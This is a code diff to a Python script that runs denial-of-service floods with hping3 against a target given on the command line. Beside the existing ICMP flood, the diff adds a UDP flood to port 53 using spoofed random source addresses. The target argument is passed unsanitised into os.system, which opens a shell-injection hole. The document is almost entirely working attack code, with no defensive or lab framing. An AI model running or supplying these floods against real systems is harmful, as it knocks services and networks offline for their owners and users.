@@ -15,6 +15,7 @@ DATA_STR = 'MB'
 INIT_WAIT = 1
 ICMP_DDoS = True
 TCP_DDoS = False
+UDP_DDoS = False
 
 
 # Get the current time 
@@ -51,6 +52,9 @@ if __name__ == "__main__":
 	# hping3 for ICMP DDoS
 	if ICMP_DDoS:
 		os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])
+	# hping3 for UDP DDoS
+	if UDP_DDoS:
+		os.system('hping3 --flood --rand-source --udp -p 53 ' + sys.argv[1])
 
 	# Show the stats
 	print('\n\n'+get_str_time() + INFO_STATS + '\n\n' + stats())
